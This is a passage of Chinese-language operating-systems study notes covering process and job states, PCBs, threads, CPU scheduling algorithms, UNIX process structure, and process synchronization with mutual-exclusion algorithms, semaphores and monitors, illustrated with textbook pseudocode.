静止阻塞态变为静止就绪态： 事件完成，即资源得到满足或者等待的事件已经发生； 静止就绪态激活变为活跃就绪态： 当静止就绪态进程具有比活跃就绪态进程更高的优先级； 内存中已经有了一大块自由空间； 当内存中没有活跃就绪态进程； 活跃就绪态挂起变为静止就绪态： 这种状态变化主要是由于系统调节负荷的需要， 或者是系统优化性能的需求。 可见，只有处于活跃就绪态的进程在得到 CPU 后才能立即投入执行，而处于静止就绪态的进程只有先成为活跃就绪态后，才可能被选中调度执行。这种方式虽然提高了内存的利用效率，但同时也使得管理更加复杂且增加了系统开销。\n2.4 作业的基本概念\u003e 2.4 作业的基本概念 # 2.4.1 作业的定义\u003e 2.4.1 作业的定义 # 把一次计算（或事务处理）过程中，从输入开始到输出结束，用户要求计算机所做的关于该次计算（或事务处理）的全部工作，称为一个作业。\n在批处理系统中，作业是抢占内存的基本单位。\n作业是否成功建立要看是否加入了作业表表项\n从用户的角度\n作业=程序+数据+作业说明书\n作业说明书：表达用户对作业的控制意图，一般由用户使用某种作业控制语言来书写\n包含三个方面的内容：\n作业的基本描述 作业的控制描述 作业的资源需求描述。 作业步：用户把要求计算机系统做的每一项相对独立的工作称为一个作业步。\n作业步之间相互独立却又有联系。\n从系统的角度\n作业=多个程序+多份数据+作业控制块 JCB（Job Control Block）\nJCB：操作系统通过 JCB 来控制程序和数据，为其分配资源，使之执行并对其进行操作。\nJCB 包括的主要内容有：\n作业名 作业状态 资源需求 作业类型 作业控制方式 作业优先权 作业表：为了对作业进行管理，操作系统将所有作业的 JCB 构成一张表，称为作业表。\n作业表一般存放在外存的固定区域中，而且其长度是固定的，即系统能同时容纳的作业数量是有限的。\n**输入作业流 **：当有若干个作业被成功创建，进入系统，被依次存放在外存上，这就形成了输入的作业流；\n处理作业流：当输入作业流在操作系统的控制下，逐个作业进行处理，这称为处理作业流。\n2.4.2 作业与进程的关系\u003e 2.4.2 作业与进程的关系 # 作业的处理依赖于进程：计算机为了处理一个作业，首先，操作系统为该作业创建一个根进程；然后，在执行作业控制语句时，根据作业说明书的要求， 由系统或根进程为该作业创建相应的子进程；之后，系统为各个子进程分配资源，并调度各子进程执行以完成作业的要求。\n作业与进程之间的区别\n本质\n作业就是用户要求计算机完成的一项任务；\n进程是系统为了完成作业而设置的动态执行体。\n资源\n作业中的作业说明书事先说好了资源的分配关系，这是静态的；\n进程是操作系统分配资源的基本单位，这是动态的。\n作业和进程的对应关系\n一个进程对应一个作业\n一个作业需要多个进程\n2.4.3 作业的状态及转换\u003e 2.4.3 作业的状态及转换 # 共四种状态\n提交态：作业由输入设备进入外存储器（也称输入井）的过程称为提交态。处于提交态的作业，其信息正在进入系统。\n可以有两种输入方式：\n作业由用户直接通过终端键盘向计算机中输入其作业； 将作业提交给操作员，并由操作员利用输入设备进行输入。 后备态：作业的全部信息都已进入输入井，并且作业控制块 JCB已经创建，此时称作业处于后备状态。\n其中，系统为该作业建立 JCB， 并把它加入到后备作业队列的过程称为作业注册。\n运行态：一个处于后备态的作业，一旦被作业调度程序选中而被送入内存中，并分配相应的资源而一组与该作业对应的进程建立后，该作业就进入了运行态。\n与作业相对应的进程，刚被创建时处于就绪状态（并非初始态），等待进程调度，参与处理机竞争，并按进程的状态转换方式转换状态。\n完成态：当作业终止，但作业所占用的资源尚未全部被系统回收时的状态称为完成态。\n作业终止可能有两种方式：\n正常运行结束； 因发生错误而终止。资源需要回收，等待系统收拾烂摊子。 2.5 进程的描述与上下文\u003e 2.5 进程的描述与上下文 # 进程实体=程序段+相关的数据段+PCB\n进程控制块（PCB）是进程实体的一部分，是操作系统为了描述和控制动态的进程及其运行而为进程定义的一种数据结构。它是进程存在的惟一标志，进程的 PCB 都是全部或部分常驻内存的，程序和数据集放在外存中，直到该进程执行时再调入内存。\n2.5.1 进程控制块 PCB\u003e 2.5.1 进程控制块 PCB # PCB 的作用\n提供了进程的描述信息、控制信息和资源信息等（几乎是管理进程的所有信息）\n标识进程的存亡。\n进程创建时，操作系统为其创建PCB，当进程消亡时，操作系统回收其PCB\n操作系统是根据 PCB 来对并发执行的进程进行管理和控制的。\n正是由于 PCB 的存在，才使得进程成为一个能独立运行的基本单位，才使得进程能与其他进程并发执行。\nPCB 中的信息\n进程标识符。\n进程的当前状态。\n仅当进程处于就绪状态时，才可能被调度执行。\n若进程处于阻塞状态，还需要在 PCB 中记录阻塞的原因，以供唤醒原语唤醒进程时用。\n进程相应的程序和数据地址。\n将 PCB 与其程序和数据联系起来。\n进程资源清单。\n列出进程所拥有的除了处理机之外的资源记录，如打开的文件列 表，拥有的 I/O 设备等。\n进程优先级。\n通常是一个表示进程使用 CPU 的优先级别的整数。\nCPU 现场保护区。\n当进程因某种原因不能继续占用 CPU 时，需要将 CPU 的各种状态信息保护起来。\n被保护的 CPU 现场信息通常有：程序状态字 PSW、程序计数器的内容、 通用寄存器的内容和用户栈的指针等。\n进程同步和通信机制。\n用于实现进程之间的互斥、同步和通信所需的信号量、信箱或消息队列的指针等。\n进程所在队列的 PCB 的连接字。\n进程 PCB 根据进程的当前状态，插入到不同的队列中。PCB 连接字指出该进程所在队列中下一个进程 PCB 的首地址。\n与进程相关的其他信息。\n如进程的家族信息、进程所属的用户、进程占用 CPU 的时间、进程记账信息等。\n2.5.2 进程上下文\u003e 2.5.2 进程上下文 # 进程上下文\n操作系统中把进程实体和支持进程运行的环境合称为进程上下文（process context）。 一个进程的上下文的结构一般由以下几个部分构成： PCB 正文段（即程序段经过编译后形成的机器指令代码集）和数据段 与该进程有关的各种寄存器和堆栈的值 进程上下文切换\n步骤：\n状态保存（state save） 选取新进程 状态恢复（state restore） 2.6 进程的控制\u003e 2.6 进程的控制 # 创建、删除进程；进程状态转换；进程通信\n达到在多个进程之间同步和高效并发执行的同时，也实现资源的共享和协调。\n2.6.1 进程控制机构\u003e 2.6.1 进程控制机构 # 进程的控制由操作系统的内核完成\n什么是操作系统的内核\n操作系统的内核由一些与硬件密切相关的模块，以及共用的基本操作构成；\n内核常驻内存，并给予特殊保护（核心态）；\n内核包含支撑功能（中断处理、时钟处理、原语操作）和资源管理功能（括进程管理、存储器管理、文件管理和设备管理）；\n.内核中与进程控制紧密相关的机构\n进程管理\n将进程管理放在内核的原因\n进程管理的相关模块的运行频率较高 它们被多种功能模块所调用 原语操作\n操作系统使用系统原语实现对进程状态改变的控制。\n原语是不可分割的，是机器指令的延伸\n对用户透明，但可以当做一类特殊的系统调用\n2.6.2 进程控制原语\u003e 2.6.2 进程控制原语 # 创建原语、撤销原语、阻塞原语和唤醒原语。\n进程创建原语\n进程可以通过调用进程创建原语来创建子进程，子子孙孙创建下去就构成了家族关系\n进程创建原语的主要操作步骤：\n向系统申请一个空闲的 PCB：扫描空闲PCB表项，获得该PCB的内部名称作为新进程的标识号PID； 为新进程分配各种资源； 初始化新进程 PCB 的内容：PCB 中填入进程名、家族信息、数据和程序地址、进程优先级、资源清单以及进程状态（就绪态）等信息； 将新进程的 PCB 插入到就绪队列。 进程撤销原语\n进程撤销的原因\n进程完成任务而正常撤销 进程由于出现某些故障或错误而被迫撤销。 两种撤销策略\n只撤销指定进程 撤销指定进程及其子孙进程 撤销指定进程及其子孙进程的操作步骤\n从系统的 PCB 表中检索出被撤销进程的 PCB，并从中读出该进程的状态，设置重新调度标志，以便在该进程撤销后将 CPU 分配给其他的进程；； 如果正处在执行态，则立即终止，设置重新调度标志； 检查子孙进程，递归终止； 递归回收被终止进程的全部资源：把属于父进程的资源归还给父进程，属于自己申请的资源则归还系统，注销其资源描述清单； 递归释放被终止进程的PCB 如果重新调度标志为真，则转到进程调度程序。 进程阻塞原语\n调用该原语的进程由执行态变为阻塞态。\n什么时候要将进程的执行态转变为阻塞态？\n当进程请求某事件尚未发生，主动放弃处理机 操作步骤\n停止调用者自身执行 保存断点信息 设置自己的状态为阻塞态 将自己的PCB插入相应事件的等待队列 转进程调度程序，从就绪队列中选择新的进程投入运行 进程唤醒原语\n发现者将一个被唤醒的进程的状态由阻塞态变为就绪态。\n什么时候要将进程的阻塞态转变为就绪态？\n等待的资源得到满足 操作步骤\n找出标识\n从阻塞队列移出\n设置为就绪态\n插入就绪队列\n考虑被唤醒进程和当前运行进程的优先级\n若被唤醒进程优先级更高则需要设置调度标志，并转进程调度程序。\n2.7 线程\u003e 2.7 线程 # 比进程更小的能独立运行的基本单位\n2.7.1 线程的概念\u003e 2.7.1 线程的概念 # 什么是线程？\n是由进程进一步派生出来的一组代码的执行过程; 是进程中相对独立的一个执行流； 是系统独立调度的基本单位。 为什么系统引入线程可以提高效率和并发性？\n线程继承共享所属进程的一切资源； 线程本身运行只需要很少一部分资源； 所以线程切换的开销比进程小得多。 什么时候线程不应该引入？\n实时系统（进程调度少） 个人数字助理系统 任务单一的系统 传统进程 和 多线程环境中的进程的区别\n传统的进程管理资源和指令的执行，多线程环境中的进程只负责资源分配和保护，线程负责执行任务；\n每个线程都有独立的系统堆栈和用户堆栈\n线程控制块（Thread Control Block，简称 TCB）是标志一个线程存在的数据结构，与 PCB 相比，TCB 中的内容较少，因为PCB还需要记录资源分配信息。\n2.7.2 线程与进程的关系\u003e 2.7.2 线程与进程的关系 # 线程和进程的比较\n资源\n进程可以拥有自己的资源\n线程可以访问进程的资源\n调度\n线程是调度的基本单位\n并发性\n两者都可以并发执行\n系统开销\n进程大于线程\n安全性\n进程比线程安全\n因为，同一个进程下的多个线程可以共享进程的资源，会发生数据篡改并导致错误\n2.7.3 线程的实现\u003e 2.7.3 线程的实现 # 用户级线程（User-Level Thread，简称 ULT）\n在用户空间，由应用程序在线程库（的支持下完成，系统内核不知道线程的存在；\n线程库是一组可供所有的应用程序共享的应用级软件包，它可以创建线程、销毁线程、支持线程通信、支持线程调度、保存和恢复线程上下文。（相当于用户级的操作系统）\n线程的 TCB 保存在用户空间，并由线程库维护，线程的建立也需由线程库在同一个进程内创建一个新线程。\n优点：\n灵活。不依赖于操作系统，可以采取与应用程序相适应的线程调度策略。 效率高。不用陷入操作系统内核。 缺点：\n无法并行。内核一次最多只给一个进程分配处理机，而所有线程均依赖于这个处理机。 会导致进程堵塞。一个线程未满足，则整个进程受阻。 内核级线程（Kernel-Level Thread，简称 KLT）\n与线程有关的工作通过系统调用交给操作系统内核处理 TCB存于操作系统空间 KLT是处理机调度的基本单位 优点： 并发性好。 通常不会导致进程堵塞 缺点： 系统开销大。因为要在内核和用户两种模式切换。 系统内核空间容易被迅速耗尽。因为线程的数量远远大于进程的，因此操作系统会限制一个应用所创建的进程。 组合线程或混合线程（hybrid thread）\n组合线程通常还需要一个用户和系统都可见的中间实体，用于在用户级线程和内核级线程之间建立联系。 在 Solaris 系统中称该中间实体为轻进程。\n每一个中间实体都与一个内核级线程相对应\n线程0 轻进程0 内核线程0 进程66 线程1 轻进程1 内核线程1 线程2 轻进程2 内核线程2 如果设计合理的话，组合线程机制能结合前两类线程的优点，并克服其缺点。\n2.8 处理机调度原理\u003e 2.8 处理机调度原理 # 处理机调度就是指CPU资源在可运行实体之间的分配\n调度的实质：资源分配\n2.8.1 处理机的四级调度\u003e 2.8.1 处理机的四级调度 # 作业调度\n对象：作业 输入井 \u0026ndash;\u0026gt; 内存 后备态 \u0026ndash;\u0026gt; 运行态 \u0026ndash;\u0026gt; 完成态 作业调度程序只负责控制，实际的存储和设备管理由相应的管理程序完成 交换调度、中级调度\n对象：进程\n功能：短期平滑和调整系统负荷\n外存 \u0026lt;\u0026ndash;\u0026gt; 内存\n激活：静止就绪态/静止阻塞态 \u0026ndash;\u0026gt; 活跃就绪态/活跃阻塞态\n挂起：活跃就绪态/活跃阻塞态 \u0026ndash;\u0026gt; 静止就绪态/静止阻塞态\n实质：存储管理中的对换功能，涉及内存的管理和扩充\n问：并发的程度是不是越高越好？不是\n切换进程和线程，系统开销大； 主存有限 资源竞争激烈，导致死锁 进程调度、低级调度\n对象：进程 内存 \u0026lt;\u0026ndash;\u0026gt; 内存 活跃就绪态 \u0026ndash;\u0026gt; 执行态 与前两种最大不同：被选中的进程能够实际获得CPU 运行频率很高并且需要常驻内存，因此算法时间复杂度不能太高 线程调度\n内核级线程调度\n内核级线程调度和进程调度的主要区别：在同一个进程内的内核级线程切换不会引起资源的切换 用户级线程调度\n操作系统在设计时不需要考虑用户级线程 2.8.2 处理机调度的目标\u003e 2.8.2 处理机调度的目标 # 提高系统资源利用率\n使各个部件均忙碌\n提高系统吞吐量，降低平均周转时间\n降低平均响应时间\n提供相对的公平机制\n其他\n考虑优先级 使系统重要参数有可预测性 2.8.3 处理机调度的方式\u003e 2.8.3 处理机调度的方式 # 非抢占（non preemptive scheduling mode）\n优点： 简单 系统开销小 缺点： 不考虑优先级，会延误时机； 导致短作业的周转时间增加； 抢占\n常见剥夺原则： 时间片原则 优先级原则 短作业优先原则 优点： 保证并发性 保证响应及时性 缺点： 实现复杂 系统开销大，影响性能 2.8.4 处理机调度的时机\u003e 2.8.4 处理机调度的时机 # 什么时候会引起调度程序工作？\n中断是调度的前提，但不是发生中断就一定会调度。\n发生请求，并等待（如：IO） 进程执行结束 发生错误 执行原语 优先级更高抢占处理机 时间片用完 2.9 调度算法\u003e 2.9 调度算法 # 资源分配算法\n批处理系统目标：提高吞吐量\n分时系统：响应时间和公平性\n实时系统：及时响应\n2.9.0 调度算法的评价指标\u003e 2.9.0 调度算法的评价指标 # CPU\\IO设备利用率=忙碌时间\\总时间\n系统吞吐量=总共完成的作业数\\总共使用的时间\n周转时间=作业完成时间-作业提交时间\n平均周转时间=各作业周转时间之和\\作业数\n带权周转时间=作业周转时间\\作业实际运行的时间 \u0026gt;=1 越小越好\n平均带权周转时间=各作业的带权周转时间之和\\作业数\n等待时间=等待处理机状态时间之和（正在等待IO设备完成的期间其实进程也是在被服务的，所以不计入等待时间）\n响应时间=从用户首次提交请求到首次产生响应所用的时间\n响应比=（等待时间+要求服务时间）\\ 要求服务时间\n2.9.1 先来先服务（First Come First Serve）\u003e 2.9.1 先来先服务（First Come First Serve） # 优点： 1. 简单 2. 公平 3. 不会饥饿 缺点： 容易使短作业感到不满 2.9.2 最短周期优先 （Shortest Job/Process First）\u003e 2.9.2 最短周期优先 （Shortest Job/Process First） # 优点：\n简单 平均周转时间最短 缺点：\n作业或进程的执行时间无法预知 对长作业不利，可能饥饿 改进：最短剩余时间优先算法SRTN\n比较进程所需要的剩余时间，更少时间的抢占处理机。\n2.9.3 最高优先级优先（Highest Priority First）\u003e 2.9.3 最高优先级优先（Highest Priority First） # 静态优先级\n调度对象在进入系统时便被赋予一个固定的优先级 优点： 简单 系统开销小 缺点： 不公平 不灵活 动态优先级\n优先级动态调整 当进程获得某种资源时，其优先级被动态提高，以便能更快获得处理机投入执行，以避免资源的浪费； 当进程处于就绪状态时，其优先级随着等待处理器的时间的增长而提高，而占有处理机的进程的优先级则随着它使用处理机的时间的增长而降低，以保证公平性等。 IO繁忙型进程可以适当提高优先级，这样可以尽早地让IO设备投入工作 优点： 公平 灵活 资源利用率高 防止饥饿 缺点： 1. 复杂 1. 系统开销大 2.9.4 时间片轮转法（Round Robin）\u003e 2.9.4 时间片轮转法（Round Robin） # 固定时间片轮转\n需要定时时钟，时间片使用完后发生中断，进入调度程序，选择下一个进程占有处理机\n可变时间片轮转\n需要定时时钟，但是时钟中断处理程序每次需要设置新的时钟常量，然后才转入处理机调度程序，选择下一个进程占有处理机。\n优点： 公平 灵活 响应及时 缺点： 1. 复杂 2. 系统开销大 3. 对偏重 I/O 的进程处理不太公平。 2.9.5 多级反馈队列\u003e 2.9.5 多级反馈队列 # 设计原则\n多级队列，Q1优先级最高\n时间片和优先级等级成反比，Q1时间片最小\n新进程进入Q1队尾，队内按先来先服务执行\n若在Q1所分配的时间片内完成作业，则撤离系统；否则，进入下一级队列Q2，直到Qmax\n前一队列空了才能轮到下一队列执行\n若被抢占，则被抢占的进程回到当前列的队尾\n优点\n短周期优先处理\n因为短周期进程一般在优先级较高的几个队列之中即被执行完毕\n系统开销小\n因为运行时间长的进程后面将进入优先级较低的队列，而这些队列的时间片较长，因而进程调度引起的进程切换的开销也比较小。\n缺点\n可能发生饥饿\n如果优先级较高的队列一直不为空，则优先级 较低的队列中的进程可能长时间无法得到执行。\n2.9.6 实时调度\u003e 2.9.6 实时调度 # 实时系统无需考虑吞吐量、平均需要时间等\n只需要做到：对时间要求最紧迫的任务先占用处理机\n如：最早截止任务优先（earliest deadline first）算法，也称动态优先级调度算法。\n2.9.7 高响应比优先（HRRN）\u003e 2.9.7 高响应比优先（HRRN） # 响应比=（等待时间+要求服务时间）\\ 要求服务时间 \u0026gt;=1\n综合了FCFS（等待时间）和SPF（要求服务时间），是非抢占算法，不会导致饥饿\n2.10 UNIX 系统进程的结构\u003e 2.10 UNIX 系统进程的结构 # 2.10.1 进程控制块 PCB\u003e 2.10.1 进程控制块 PCB # UNIX 进程控制块（也称进程登记表）分为二个部分：proc 结构和 user 结构。\nproc 结构常驻内存，user 结构不常驻内存。\n把 UNIX 进程控制块分成二部分的原因是为了节省内存空间\nproc结构\n每个进程占用数组中的一个元素。\n例如 0 号进程（又称系统进程）的 proc 结构则占用 proc[0]。\n内容\n进程状态 p_stat 进程状态 p_flag 进程标志 p_pri 进程优先数 用户标识符 进程标识符 存储区位置和长度 软中断信号：记录其他进程发来的软中断信号 计时项 调度参数：进程调度时用到的参数 指向user结构的指针：通过该指针使 proc 结构和 user 结构成为一个整体，构成 完整的进程控制块 PCB。 指向虚拟存储空间管理表格的指针：用于实现虚实地址变换。 user 结构\n不常驻内存，只有进程执行时才需存取的控制信息 进程的私有数据结构，只能自己存取 2.10.2 进程的上下文\u003e 2.10.2 进程的上下文 # 用户级上下文\n寄存器上下文\n系统级上下文\n静态部分：\nproc结构 user结构 用于虚实地址映射的虚拟存储空间管理表格 动态部分：\n核心栈\n核心栈（kernal stack）是进程执行核心程序时使用的栈，栈中装有进程调用核心函数时用到的有关参数和返回地址。\n若干层寄存器\n层的数目是变化的，满足后进先出的规则\n2.10.3 进程的状态及转换\u003e 2.10.3 进程的状态及转换 # 进程的状态\n正在执行的进程是处于核心态还是用户态由当前进程的 PSW 状态字中相应位来决定。\n用户态执行 核心态执行 内存就绪态 内存睡眠态 外存就绪态 外存睡眠态 被剥夺态（相当于内存就绪态）：当运行的进程要从核心态返回到用户态时 创建态：创建态是除进程 0 之外的所有进程的初始状态 僵死态：执行了exit，此时进程已经不存在。但它留下了一个包含状态码和计时统计信息供其父进程来收集。僵死态是进程的终态 转换过程\n3. 进程同步与通信\u003e 3. 进程同步与通信 # 进程的通信机制可以协调进程之间的关系\n低级通信：传送的信息量少，包括进程的互斥与同步\n高级通信：传送大量数据，目的是信息交换\n3.1 进程的并发执行\u003e 3.1 进程的并发执行 # 会产生进程间互斥和同步，对临界资源的访问如果不合理，会产生死锁的问题\n3.1.1 与时间有关的错误\u003e 3.1.1 与时间有关的错误 # 并发的进程中共享了公共变量，使得程序的执行与并发进程执行的速度有关，这种错误的结果往往与时间有关，因此被称为“与时间有关的错误”。\n3.1.2 Bernstein条件\u003e 3.1.2 Bernstein条件 # 我们希望程序能够同时具有封闭性、可再现性、并发性。\n若Bernstein条件被满足，则并发执行不会对执行结果的封闭性和可再现性产生影响\n3.1.3 临界资源与临界区\u003e 3.1.3 临界资源与临界区 # 临界资源：系统中一次只允许被一个进程使用的一类资源\n临界区：就是在进程中访问临界资源的那一段程序\n进入区：进入临界区前的检测区\n退出区：将被访问的临界资源标志恢复为未访问状态\n剩余区：其余的代码\n3.2 进程的互斥\u003e 3.2 进程的互斥 # 3.2.1 软件实现方法\u003e 3.2.1 软件实现方法 # 严格轮换\nint turn=1; /*设置一个公共整型变量，用来标识允许进入临界区的进程。*/ /* 进程强制以交替的次序严格轮流进入临界区 缺点：忙等待、资源利用不充分 */ 进程 1： while (TRUE) { while (turn != 1); /*进入区*/ Critial_region1(); /*临界区*/ turn = 2; /*退出区*/ other_region1(); /*剩余区*/ } 进程 2： while (TRUE) { while (turn != 2); /*进入区*/ Critial_region2(); /*临界区*/ turn = 1; /*退出区*/ other_region2(); /*剩余区*/ } Dekker算法\n算法复杂，被取代\nPeterson算法\nenum boolean {false, true}; /*标识数组，标识每个进程，true为表示该进程想进入临界区*/ Boolean flag[2] = {false, false}; /*公共变量，turn=i的时候，i可以进入临界区*/ int turn; /*缺点：依旧忙等待，但可以使得进程可以在有限的时间内进入临界区*/ 进程 1： while (TRUE) { flag[0] = true; /*进入区*/ /*进入区2，通过turn值的设置和其后的while语句来保证任何时候最多只有一个进程可以进入临界区*/ turn = 2; /*进入区3，当对方不在临界区并且不想进入临界区时才允许自己进入临界区*/ while (flag[1] \u0026amp;\u0026amp; turn == 2); Critial_region1(); /*临界区*/ flag[0] = false; /*退出区*/ other_region1(); /*剩余区*/ } 进程 2： while (TRUE) { flag[1] = true; /*进入区*/ turn = 1; /*进入区*/ while (flag[0] \u0026amp;\u0026amp; turn == 1); /*进入区*/ Critial_region2(); /*临界区*/ flag[1] = false; /*退出区*/ other_region2(); /*剩余区*/ } 3.2.2 硬件实现方法\u003e 3.2.2 硬件实现方法 # 关中断\n每个进程在刚进入临界区之后就立即关闭所有中断，直到进程离开临界区再打开中断\n优点：简单\n缺点：\n不适用与多CPU系统，因为中断只对执行该命令的那个CPU有效 使用不当，后果严重 限制处理器交叉执行程序的能力，会影响系统效率 { disable； /*关中断，进入区*/ Critial_region();/*临界区*/ enable； /*开中断，退出区*/ other_region(); /*剩余区*/ } 使用测试和设置指令（testandset）\n会忙等待\n/*use=0的时候说明资源未被占用， 若进程在访问临界区时的use=1，则会一直测试use，直到它等于0*/ TestAndSet(use) { while (use == 1); use = 1; } /*用测试与设置指令实现进程互斥的描述如下*/ boolean use = 0; /*初始资源空闲*/ 进程 i： TestAndSet(use); /*进入区*/ Critial_region(); /*临界区*/ use = 0; /*退出区*/ other_region(); /*剩余区*/ 使用对换指令（swap）\n会忙等待\n/*。在进入临界区之前， 先交换 use 与 k，若交换后 k=0，说明资源未被占用，则进入临界区；若交换后 k=1，说明资 源被占用，继续交换 use 与 k 直到 k=0。*/ Swap( boolean *a, boolean *b) { boolean temp; temp = *a; *a = *b; *b = temp; } //用交换指令实现进程互斥的描述如下： boolean k = true; /*初始化为 1*/ boolean use =false; /*初始资源空闲*/ while ( k != 0) Swap(\u0026amp;use, \u0026amp;k); /*进入区*/ Critial_region(); /*临界区*/ use = 0; /*退出区*/ other_region(); /*剩余区*/ 3.3 进程的同步\u003e 3.3 进程的同步 # 3.3.1 同步的概念\u003e 3.3.1 同步的概念 # 不同的进程之间具有先后的制约关系\n3.3.2 同步的实现方法\u003e 3.3.2 同步的实现方法 # sleep和wakeup原语：\n进程 1： … /*其他代码*/ S1; /*S1 语句，须在进程 2 的 S2 语句之前执行*/ wakeup(进程 2);/*唤醒进程 2*/ … /*其他代码*/ 进程 2： … /*其他代码*/ sleep; /*阻塞自己*/ S2; /*S2 语句，须在进程 1 的 S1 语句之后执行*/ … /*其他代码*/ 这种方法会信号丢失\n3.3.3 生产者-消费者问题\u003e 3.3.3 生产者-消费者问题 # 3.4 信号量\u003e 3.4 信号量 # P （Down）减少 使用资源\nV（Up）增加 释放资源\n3.4.1 信号量的原理\u003e 3.4.1 信号量的原理 # 信号量只能被两个标准的原语wait（S）和signal（S）访问\n整型信号量\n依旧未解决忙等待的问题\n记录型信号量\n解决了忙等待问题，需要一个代表资源数目的整型变量value和一个进程链表L，用于链接所有等待该资源的进程。\ntypedef struct{ int value; struct process *L; }semaphore; wait操作\nvoid wait(semaphore S){ S.value--;//请求一个该类资源 if(S.value\u0026lt;0){//表示资源已经分配完 add this process P from S.L;//插入该类资源的等待队列 wakeup(P);//自我阻塞 } } signal操作\nvoid signal(semaphore S){ S.value++;//释放一个资源 if(S.value\u0026lt;=0){//如果＋1后仍然资源不足，则表示有进程在等待该资源 remove a process P from S.L;//从等待队列中移出队首进程 wakeup(P);//调用wakeup原语唤醒该进程 } } 3.4.2 用信号量实现进程互斥\u003e 3.4.2 用信号量实现进程互斥 # 总的来说就是PV操作要夹紧使用互斥资源的那个行为（临界区），中间不能有其他的代码。\n若有三个并发进程，设 R 为互斥信号量，其初值为 1，则其取值范围为（-2，-1，0，1）。\n其中 R=1 表示所有进程都未进入临界区；\nR=0 表示有 1 个进程进入临界区；\nR=-1 表示有 1 个进程进入临界区且有另一个进程等待进入临界区；\nR=-2 表示有 1 个进程进入临界区且另两个进程等待进入临界区。\n进程 1： Down(R); /*进入区*/ Critial_region1(); /*临界区*/ Up(R); /*退出区*/ other_region1(); /*剩余区*/ 进程 2： Down(R); /*进入区*/ Critial_region2(); /*临界区*/ Up(R); /*退出区*/ other_region2(); /*剩余区*/ 进程 3： Down(R); /*进入区*/ Critial_region3(); /*临界区*/ Up(R); /*退出区*/ other_region3(); /*剩余区*/ 3.4.3 用信号量实现进程的同步\u003e 3.4.3 用信号量实现进程的同步 # 可以根据进程关系前驱图来确定PV的顺序\n与上一节用 sleep 和 wakeup 原语解决本问题相比，信号量使得信号可以累积而不会丢失。\n若进程1先上处理机，则顺利执行s1，然后V(S)操作会使得S=1，且唤醒进程2，进程2在执行s2语句之前会先检查S，执行P(S)操作，使得S-1，此时S-1=0，可以顺利执行s2语句。\n若进程2先上处理机，则会使得S-1=-1，阻塞自己，直到进程1执行s1和V(S)，进程2才会继续运行。\nSemaphore S=0; /*公共信号量初始化为 0*/ 进程 1： … /*其他代码*/ S1; /*S1 语句，须在进程 2 的 S2 语句之前执行*/ Up(S); /*Up 原语*/ … /*其他代码*/ 进程 2： … /*其他代码*/ Down(S); /*Down 原语*/ S2; /*S2 语句，须在进程 1 的 S1 语句之后执行*/ … /*其他代码*/ 3.4.4 用信号量解决生产者—消费者问题\u003e 3.4.4 用信号量解决生产者—消费者问题 # 单生产者单消费者问题\nsemaphore mutex = 1;//临界区互斥信号量 semaphore empty = n;//空闲缓冲区 semaphore full = 0;//缓冲区初始化为空 producer(){ whlie(1){ product an item in nextp; P(empty);//先同步，生产数据 P(mutex);//互斥夹紧 add nextp to buffer; V(mutex)； V(full); //唤醒消费者进程 } } comsumer(){ while(1){ P(full); P(mutex); remove an item from buffer; V(mutex); V(empty);//唤醒生产者进程 comsume teh item; } } 需要注意的是：生产者进程先执行 Down(empty)，然后执行 Down(mutex)，他们的顺序是不能颠倒的；消费者进程先执行 Down(full)，然后执行 Down(mutex)，他们的顺序也是不能颠倒的。否则可能出现错误。 我们假设把他们的顺序都颠倒，会出现什么情况呢？一种情况：当生产者进程把缓冲区放满了，调度程序继续让生产者进程运行，它先执行 Down(mutex)，进入临界区，接着执行 Down(empty)时将被阻塞；接着轮到消费者进程执行，它也先执行 Down(mutex)，然而生产者进程已进入缓冲区，因此消费者进程也会被阻塞。这样一来，生产者和消费者进程都将阻 塞，都指望对方唤醒自己，陷入了无休止的等待了。\n多生产者多消费者问题\n问题描述：桌子上有一个盘子，每次只能向其中放入一个水果。爸爸专向盘子中放苹果，妈妈专向盘子中放橘子，儿子专等吃盘子中的橘子，女儿专等吃盘子中的苹果。只有盘子为空时，爸爸或妈妈才可向盘子中放一个水果：仅当盘子中有自己需要的水果时，儿子或女儿可以从盘子中取出。\n问题分析： 1)关系分析。这里的关系要稍复杂一些。由每次只能向其中放入一只水果可知，爸爸和妈妈是互斥关系。爸爸和女儿、妈妈和儿子是同步关系，而且这两对进程必须连起来，儿子和女儿之间没有互斥和同步关系，因为他们是选择条件执行，不可能并发。\n2)整理思路。这里有4个进程，实际上可抽象为两个生产者和两个消费者被连接到大小为1的缓冲区上。\n3)信号量设置。首先将信号量plate设置互斥信号量，表示是否允许向盘子放入水果，初值为1表示允许放入，且只允许放入一个。信号量apple表示盘子中是否有苹果，初值为0表示盘子为空，不许取，apple=1表示可以取。信号量orange表示盘子中是否有橘子，初值为0表示盘子为空，不许取，orange=1表示可以取。\n3.4.5 信号量小结及其不足\u003e 3.4.5 信号量小结及其不足 # 优点：\n可以解决忙等待的问题 可以解决所有互斥和同步问题 不会丢失信号 缺点：\n维护复杂，容易产生错误 使用要点：\n互斥夹紧，同步在前 3.4.6 分析步骤\u003e 3.4.6 分析步骤 # 分析活动，划定临界资源和临界区 设置互斥信号量semaphore mutex = 1不同临界资源需要不同的互斥信号量） 分析什么地方需要实现同步关系（一前一后） 前驱关系图，每一对前驱关系都要设置一个同步信号量，前V后P 互斥夹紧，同步在前（互斥时PV成对出现在同一个进程中，同步时PV出现在不同进程中） 3.5 管程(Monitor)\u003e 3.5 管程(Monitor) # 为了解决信号量存在的分散编程带来的困难;\n管程是一个程序语言级别的构造，其正确性由编译器负责保证。是有些高级语言带有管程，而有些高级语言则不支持管程。\n管程是一个软件模块\n3.5.1 管程的定义、结构和原理\u003e 3.5.1 管程的定义、结构和原理 # 管程应该具备的性质\n要有数据，和对数据的操作\n管程这种扩展了的抽象数据类型的描述对象是共享资源\n能单独编译\n满足信息掩蔽原则，即调用者不知道内部具体的实现细节\n具有互斥和同步的机制（核心）\n同一时间只有一个进程或线程访问管程；\n这一机制在Java中以关键字synchronized标识；\n管程由4部分构成\n管程的名称\n局部与管程内部的共享数据结构说明\n操作过程（函数）\n对共享数据赋初值的语句\n入口等待队列\n申请进程只能互斥地进入管程，进程1进入了管程后，编译器会给该管程加锁，此时进程2、进程3等必须加入等待队列，等待进程1使用完管程解锁。\n这种入口等待队列可以很好的实现互斥，那么同步如何实现？\n条件变量和同步原语 wait 和 signal\n一个进程被阻塞或挂起的原因 （或条件）可以有多个，而条件变量就是在管程中被用来描述这些原因（或条件）的一种抽象数据类型。因此为了描述多种原因，可以在管程中可以设置多个条件变量。\n条件变量只是一个特殊的链表或者队列，该链表或者队列只能在管程内被 wait 和 signal 